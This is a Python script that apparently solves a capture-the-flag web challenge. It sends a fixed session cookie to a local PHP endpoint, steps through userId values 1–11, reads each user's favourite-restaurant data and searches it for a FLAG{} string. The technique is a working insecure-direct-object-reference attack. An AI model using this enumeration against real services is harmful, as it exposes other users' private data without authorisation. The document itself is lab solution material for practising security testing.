import requests
import json
import re

base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"
session = requests.Session()
session.cookies.set("PHPSESSID", "hk4mi61pda6ge5d66s5qjhkil3")

print("[*] Searching for FLAG{} patterns in all user responses")
print("[*] Checking users 1-11 (users with data)\n")

flag_found = False

for user_id in range(1, 12):
    try:
        url = f"{base_url}{endpoint}?userId={user_id}"
        response = session.get(url, timeout=10)
        
        if response.status_code == 200:
            # Search for FLAG pattern in raw response text
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            if flag_match:
                flag_value = flag_match.group(0)
                print(f"[!] FLAG FOUND for userId={user_id}:")
                print(f"  FLAG: {flag_value}")
                print(f"  Full response:\n{response.text}\n")
                flag_found = True
            else:
                print(f"[-] No FLAG pattern in userId={user_id}")
                # Print relevant data if contains restaurants
                try:
                    data = response.json()
                    if data.get('success') and data.get('data', {}).get('restaurants'):
                        username = data.get('data', {}).get('username', 'unknown')
                        restaurants = data.get('data', {}).get('restaurants', [])
                        print(f"  User: {username}, Restaurants: {restaurants[:3]}{'...' if len(restaurants) > 3 else ''}")
                except:
                    pass
        else:
            print(f"[-] userId={user_id}: Status {response.status_code}")
    except Exception as e:
        print(f"[!] userId={user_id}: Error - {str(e)}")

print("\n" + "="*60)
if flag_found:
    print("[+] FLAG FOUND in responses")
else:
    print("[-] No FLAG{} pattern found in any user response")
print("="*60)
